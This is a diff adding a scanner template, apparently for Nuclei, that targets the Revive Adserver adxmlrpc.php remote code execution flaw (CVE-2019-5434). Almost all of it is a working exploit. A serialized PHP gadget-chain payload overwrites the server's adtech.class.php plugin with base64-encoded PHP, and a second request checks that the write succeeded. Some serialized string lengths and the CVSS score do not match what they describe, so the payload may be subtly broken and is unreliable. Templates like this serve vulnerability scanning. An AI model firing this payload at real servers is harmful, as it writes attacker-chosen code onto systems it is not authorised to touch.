@@ -1,0 +1,78 @@
+id: CVE-2019-5434
+
+info:
+  name: Revive Adserver adxmlrpc.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Revive Adserver's XML-RPC script in versions prior to 4.2.0 has a vulnerability allowing attackers to execute arbitrary code.
+  reference:
+    - https://www.revive-adserver.com/security/revive-sa-2019-001/
+  classification:
+    cve-id: CVE-2019-5434
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.0
+
+http:
+  - raw:
+      - |
+        POST /adxmlrpc.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        <?xml version="1.0" encoding="ISO-8859-1"?>
+        <methodCall>
+          <methodName>openads.spc</methodName>
+          <params>
+            <param>
+              <value>
+                <struct>
+                  <member>
+                    <name>remote_addr</name>
+                    <value>8.8.8.8</value>
+                  </member>
+                  <member>
+                    <name>cookies</name>
+                    <value><array></array></value>
+                  </member>
+                </struct>
+              </value>
+            </param>
+            <param>
+              <value>
+                <string>
+                  a:1:{S:4:"what";O:11:"Pdp\\Uri\\Url":1:{S:17:"\\00Pdp\\5CUri\\5CUrl\\00host";O:21:"League\\Flysystem\\File":2:{S:7:"\\00*\\00path";S:42:"plugins/3rdPartyServers/ox3rdPartyServers/adtech.class.php";S:13:"\\00*\\00filesystem";O:21:"League\\Flysystem\\File":2:{S:7:"\\00*\\00path";S:65:"x://data:text/html;base64,PD9waHAgZWNobyAiaGVsbG8iOyA/Pg==";S:13:"\\00*\\00filesystem";O:29:"League\\Flysystem\\MountManager":2:{S:14:"\\00*\\00filesystems";a:1:{S:1:"x";O:27:"League\\Flysystem\\Filesystem":2:{S:10:"\\00*\\00adapter";O:30:"League\\Flysystem\\Adapter\\Local":1:{S:13:"\\00*\\00pathPrefix";S:0:"";}S:9:"\\00*\\00config";O:23:"League\\Flysystem\\Config":1:{S:11:"\\00*\\00settings";a:1:{S:15:"disable_asserts";b:1;}}}}S:10:"\\00*\\00plugins";a:1:{S:10:"__toString";O:34:"League\\Flysystem\\Plugin\\ForcedCopy":0:{}}}}}}}</string>
+              </value>
+            </param>
+            <param><value><string>0</string></value></param>
+            <param></param>
+            <param><value><boolean>1</boolean></value></param>
+            <param><value><boolean>0</boolean></value></param>
+            <param><value><boolean>1</boolean></value></param>
+          </params>
+        </methodCall>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "hello"
+
+  - raw:
+      - |
+        GET /plugins/3rdPartyServers/ox3rdPartyServers/adtech.class.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "hello"
